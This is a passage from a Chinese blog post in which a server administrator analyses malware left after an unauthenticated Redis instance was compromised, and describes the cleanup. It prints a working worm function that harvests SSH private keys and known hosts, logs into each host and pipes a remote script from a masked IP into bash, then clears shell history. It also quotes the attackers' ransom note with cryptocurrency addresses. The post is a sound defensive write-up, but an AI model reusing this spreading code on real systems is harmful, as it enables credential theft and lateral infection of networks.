+<span class="line"><span>这段代码旨在修改和设置定时任务的配置以及相关文件的属性</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="解决方法-3" tabindex="-1"><a class="header-anchor" href="#解决方法-3"><span>解决方法</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>chattr -ia /var/spool/cron</span></span>
+<span class="line"><span>chattr -ia /etc/crontab</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>vi /etc/crontab</span></span>
+<span class="line"><span>rm -rf   /etc/crontab~</span></span>
+<span class="line"><span>rm -rf /etc/crontaz~</span></span>
+<span class="line"><span>systemctl restart crond</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="_15-获取局域网ip-并且感染对应" tabindex="-1"><a class="header-anchor" href="#_15-获取局域网ip-并且感染对应"><span>15.获取局域网IP，并且感染对应</span></a></h2><h3 id="恶意代码和解释-5" tabindex="-1"><a class="header-anchor" href="#恶意代码和解释-5"><span>恶意代码和解释</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>localgo() {</span></span>
+<span class="line"><span>    KEYS=$(find ~/ /root /home -maxdepth 2 -name &#39;id_rsa*&#39; | grep -vw pub)</span></span>
+<span class="line"><span>    # KEYS：使用 find 命令搜索用户目录下的 id_rsa 私钥文件，排除 .pub 后缀的公钥文件。</span></span>
+<span class="line"><span>    </span></span>
+<span class="line"><span>    KEYS2=$(cat ~/.ssh/config /home/*/.ssh/config /root/.ssh/config | grep IdentityFile | awk -F &quot;IdentityFile&quot; &#39;{print $2 }&#39;)</span></span>
+<span class="line"><span>    # KEYS2：从 SSH 配置文件中提取 IdentityFile 的路径。</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>    KEYS3=$(find ~/ /root /home -maxdepth 3 -name &#39;*.pem&#39; | uniq)</span></span>
+<span class="line"><span>    #KEYS3：使用 find 命令搜索用户目录下的 .pem 文件。</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>    HOSTS=$(cat ~/.ssh/config /home/*/.ssh/config /root/.ssh/config | grep HostName | awk -F &quot;HostName&quot; &#39;{print $2}&#39;)</span></span>
+<span class="line"><span>    #HOSTS：从 SSH 配置文件中提取 HostName。</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>    HOSTS2=$(cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -E &quot;(ssh|scp)&quot; | grep -oP &quot;([0-9]{1,3}\.){3}[0-9]{1,3}&quot;)</span></span>
+<span class="line"><span>    #HOSTS2：从用户的命令历史中提取出使用 SSH 或 SCP 连接过的 IP 地址。</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>    HOSTS3=$(cat ~/*/.ssh/known_hosts /home/*/.ssh/known_hosts /root/.ssh/known_hosts | grep -oP &quot;([0-9]{1,3}\.){3}[0-9]{1,3}&quot; | uniq)</span></span>
+<span class="line"><span>    # HOSTS3：从已知主机的 SSH 密钥文件中提取出 IP 地址。</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>    USERZ=$(</span></span>
+<span class="line"><span>        echo &quot;root&quot;</span></span>
+<span class="line"><span>        find ~/ /root /home -maxdepth 2 -name &#39;\.ssh&#39; | uniq | xargs find | awk &#39;/id_rsa/&#39; | awk -F&#39;/&#39; &#39;{print $3}&#39; | uniq | grep -v &quot;\.ssh&quot;</span></span>
+<span class="line"><span>        # USERZ：从目录结构中提取用户列表，排除 .ssh 目录。</span></span>
+<span class="line"><span>    )</span></span>
+<span class="line"><span>    userlist=$(echo $USERZ | tr &#39; &#39; &#39;\n&#39; | nl | sort -u -k2 | sort -n | cut -f2-)</span></span>
+<span class="line"><span>    </span></span>
+<span class="line"><span>    hostlist=$(echo &quot;$HOSTS $HOSTS2 $HOSTS3&quot; | grep -vw 127.0.0.1 | tr &#39; &#39; &#39;\n&#39; | nl | sort -u -k2 | sort -n | cut -f2-)</span></span>
+<span class="line"><span>    keylist=$(echo &quot;$KEYS $KEYS2 $KEYS3&quot; | tr &#39; &#39; &#39;\n&#39; | nl | sort -u -k2 | sort -n | cut -f2-)</span></span>
+<span class="line"><span>    </span></span>
+<span class="line"><span>    # userlist、hostlist、keylist：整理和排序上述提取出的用户、主机和密钥列表。</span></span>
+<span class="line"><span>    </span></span>
+<span class="line"><span>    for user in $userlist; do</span></span>
+<span class="line"><span>        for host in $hostlist; do</span></span>
+<span class="line"><span>            for key in $keylist; do</span></span>
+<span class="line"><span>                chmod +r $key; chmod 400 $key</span></span>
+<span class="line"><span>                ssh -o StrictHostKeyChecking=no -o BatchMode=yes -o ConnectTimeout=5 -i $key $user@$host &quot;(curl -fsSL  http://XX.XX.XX.XX/php/php_8020.sh||cd1 -fsSL  http://XX.XX.XX.XX/php/php_8020.sh) | bash&quot;</span></span>
+<span class="line"><span>            done</span></span>
+<span class="line"><span>        done</span></span>
+<span class="line"><span>    done</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>}</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>if [ ! -f &quot;/var/tmp/.alsp&quot; ];</span></span>
+<span class="line"><span>then</span></span>
+<span class="line"><span>  localgo</span></span>
+<span class="line"><span>  echo &#39;lockfile&#39; &gt; /var/tmp/.alsp</span></span>
+<span class="line"><span>  chattr +i /var/tmp/.alsp</span></span>
+<span class="line"><span>else</span></span>
+<span class="line"><span>  echo &quot;replay .. i know this server ...&quot;</span></span>
+<span class="line"><span>  exit</span></span>
+<span class="line"><span>fi</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>echo &quot;[*] Setup compXlete&quot;</span></span>
+<span class="line"><span>curl ldfx58.XXXX.io</span></span>
+<span class="line"><span>history -c</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>这段代码的目的是在远程主机上执行一段命令，通过 SSH 连接进行操作。在第一次执行时，它会执行 localgo 函数以搜索和连接主机，并在这些主机上执行一段远程命令。在执行完毕后，会创建一个锁文件 /var/tmp/.alsp 来防止再次执行。最后，输出一些信息并清除命令历史。</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="解决方法-4" tabindex="-1"><a class="header-anchor" href="#解决方法-4"><span>解决方法</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>获取变量</span></span>
+<span class="line"><span>KEYS=$(find ~/ /root /home -maxdepth 2 -name &#39;id_rsa*&#39; | grep -vw pub)</span></span>
+<span class="line"><span>KEYS2=$(cat ~/.ssh/config /home/*/.ssh/config /root/.ssh/config | grep IdentityFile | awk -F &quot;IdentityFile&quot; &#39;{print $2 }&#39;)</span></span>
+<span class="line"><span>KEYS3=$(find ~/ /root /home -maxdepth 3 -name &#39;*.pem&#39; | uniq)</span></span>
+<span class="line"><span>HOSTS=$(cat ~/.ssh/config /home/*/.ssh/config /root/.ssh/config | grep HostName | awk -F &quot;HostName&quot; &#39;{print $2}&#39;)</span></span>
+<span class="line"><span>HOSTS2=$(cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -E &quot;(ssh|scp)&quot; | grep -oP &quot;([0-9]{1,3}\.){3}[0-9]{1,3}&quot;)</span></span>
+<span class="line"><span>HOSTS3=$(cat ~/*/.ssh/known_hosts /home/*/.ssh/known_hosts /root/.ssh/known_hosts | grep -oP &quot;([0-9]{1,3}\.){3}[0-9]{1,3}&quot; | uniq)</span></span>
+<span class="line"><span>USERZ=$(</span></span>
+<span class="line"><span>        echo &quot;root&quot;</span></span>
+<span class="line"><span>        find ~/ /root /home -maxdepth 2 -name &#39;\.ssh&#39; | uniq | xargs find | awk &#39;/id_rsa/&#39; | awk -F&#39;/&#39; &#39;{print $3}&#39; | uniq | grep -v &quot;\.ssh&quot;</span></span>
+<span class="line"><span>    )</span></span>
+<span class="line"><span>userlist=$(echo $USERZ | tr &#39; &#39; &#39;\n&#39; | nl | sort -u -k2 | sort -n | cut -f2-)</span></span>
+<span class="line"><span>hostlist=$(echo &quot;$HOSTS $HOSTS2 $HOSTS3&quot; | grep -vw 127.0.0.1 | tr &#39; &#39; &#39;\n&#39; | nl | sort -u -k2 | sort -n | cut -f2-)</span></span>
+<span class="line"><span>keylist=$(echo &quot;$KEYS $KEYS2 $KEYS3&quot; | tr &#39; &#39; &#39;\n&#39; | nl | sort -u -k2 | sort -n | cut -f2-)    </span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>echo $KEYS</span></span>
+<span class="line"><span>/root/.ssh/id_rsa /root/.ssh/id_rsa</span></span>
+<span class="line"><span>echo $KEYS2</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>echo $KEYS3</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>echo $HOSTS</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>echo $HOSTS2</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>echo $HOSTS3</span></span>
+<span class="line"><span>10.168.0.4 10.168.0.5 172.30.149.186 172.30.149.185 172.30.149.184 172.30.149.190 172.30.149.186 172.30.149.185 172.30.149.184 172.30.149.190</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>echo $USERZ</span></span>
+<span class="line"><span>root www</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>echo $userlist</span></span>
+<span class="line"><span>root www</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>echo $hostlist</span></span>
+<span class="line"><span>10.168.0.4 10.168.0.5 172.30.149.186 172.30.149.185 172.30.149.184 172.30.149.190</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>echo $keylist</span></span>
+<span class="line"><span>/root/.ssh/id_rsa</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>ssh -o StrictHostKeyChecking=no -o BatchMode=yes -o ConnectTimeout=5 -i /root/.ssh/id_rsa root@172.30.149.186</span></span>
+<span class="line"><span>报错：</span></span>
+<span class="line"><span>ssh: connect to host 172.30.149.186 port 22: Connection refused</span></span>
+<span class="line"><span>修改登录ssh端口，保护了局域网的其他主机</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>chattr -i /var/tmp/.alsp</span></span>
+<span class="line"><span>rm -rf /var/tmp/.alsp</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h1 id="安全防护" tabindex="-1"><a class="header-anchor" href="#安全防护"><span>安全防护</span></a></h1><p>查找原因，初步原因可能是redis，但是redis并没有暴露到公网。</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span></span></span>
+<span class="line"><span># netstat -tunpl|grep redis</span></span>
+<span class="line"><span>tcp        0      0 172.30.149.182:63920    0.0.0.0:*               LISTEN      1054/redis-server 1 </span></span>
+<span class="line"><span>tcp        0      0 127.0.0.1:63920         0.0.0.0:*               LISTEN      1054/redis-server 1</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>127.0.0.1:63920&gt; KEYS *</span></span>
+<span class="line"><span>1) &quot;READ_ME_TO_RECOVER_DATA&quot;</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>127.0.0.1:63920&gt; get READ_ME_TO_RECOVER_DATA</span></span>
+<span class="line"><span>&quot;We delete all databases, but download a copy to our server. The only way of recovery is you must send 0.01 BTC to XXXXXXXXXXXXXXXXX. You have until 48 hours to pay or data will be inaccessible. Once paid please email XXX@onionmail.com with code: `XXX` and we will recover your database. please read https://XXXXX.sh/XXXXXXXXXXXX for more information&quot;</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>妥妥的威胁！</span></span>
+<span class="line"><span>127.0.0.1:63920&gt; del READ_ME_TO_RECOVER_DATA #删除 READ_ME_TO_RECOVER_DATA</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># 关闭 redis</span></span>
+<span class="line"><span>redis-cli -h 127.0.0.1 -p 63920 shutdown</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>访问留下来的链接</p><p><img src="https://imgoss.xgss.net/picgo/image-20230817162847974.png?aliyun" alt="image-20230817162847974"></p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>There are different ways you can buy Bitcoin. You can pay with credit or debit card at these websites</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>Moonpay - https://www.moonpay.com/buy/btc</span></span>
+<span class="line"><span>Coinbase - https://www.coinbase.com/</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>On this site you can use various methods such as apple Pay, gift card to buy Bitcoin</span></span>
+<span class="line"><span>Paxful - https://paxful.com/buy-bitcoin</span></span>
+<span class="line"><span>Agoradesk - https://agoradesk.com/</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>If Bitcoin does not suit your needs, we can accept other cryptocurrencies. We cannot accept fiat, CRYPTO IS ONLY PAYMENT</span></span>
+<span class="line"><span>Send the amount provided to the right address</span></span>
+<span class="line"><span>3.36 LITECOIN (LTC) - LecBz5uWLaQhoqu1vcDjSxm8yc6fMuaaKc</span></span>
+<span class="line"><span>1.81 MONERO (XMR) - 43pt1h8xCymBbN1t8nU7fjdUWHKTVx3ppCVbmc75C6btSuPxm5MspNrFZFtD6bhevH2JdPQJP2vGCLRdbr616Kgs1snvuZF</span></span>
+<span class="line"><span>0.16 ETHEREUM (ETH) - 0xA942bB96B758E1271Be56744c29d8dCF14A56E3a</span></span>
+<span class="line"><span>9.13 DASH - XihfDnbrDAHT7a9Yc3y8fjvMcDQfWVPSmk</span></span>
+<span class="line"><span>3898 DOGECOIN (DOGE) - D5agMNse94NhZtCjSSQtiw2sjh6N7fJCqF</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>When using other coins please mention that in email.</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>There is no other method of recovery from us other than payment. After 48 hours you will forever lose access to data </span></span>
+<span class="line"><span>and we may do our own things with it. We will either sell your database on dark net markets, disclose data to your</span></span>
+<span class="line"><span>users and ask payment there or simply delete it.</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>因为redis端口是对内网，所以配置redis是无密码，没想到还是中招了。</p><h2 id="解决方法-5" tabindex="-1"><a class="header-anchor" href="#解决方法-5"><span>解决方法</span></a></h2><p>给redis添加复杂密码，或者关闭reidis。</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>修改配置文件中的密码</span></span>
+<span class="line"><span>requirepass XXXXXXX</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># redis-cli -h 127.0.0.1 -p 63920 -a XXXXXXX</span></span>
+<span class="line"><span>127.0.0.1:63920&gt; info</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>排查其他服务器，是否还有没有密码的redis，没有密码的redis服务器一定要添加复杂的密码，即使没有端口没有暴漏公网。</p><h2 id="安全等级增加" tabindex="-1"><a class="header-anchor" href="#安全等级增加"><span>安全等级增加</span></a></h2><p>后期为了安全需要做个堡垒机了，这个就以后专门写一篇相关的文章。</p></div><!----><!----><!----></div><footer class="vp-page-meta"><!----><div class="vp-meta-item git-info"><div class="update-time"><span class="vp-meta-label">Last Updated:</span><time class="vp-meta-info" datetime="2025-06-17T03:04:05.000Z" data-allow-mismatch>6/17/25, 3:04 AM</time></div><div class="contributors"><span class="vp-meta-label">Contributors: </span><!--[--><!--[--><span class="vp-meta-info" title="email: star@xgss.net">star</span><!--]--><!--]--></div></div></footer><!----><!----><!----><!--]--></main><!--]--><!----></div><!--]--><!--]--><!--[--><!----><!--[--><!--]--><!--]--><!--]--></div>
+    <script type="module" src="/assets/app-DbDHfX93.js" defer></script>
+  </body>
+</html>
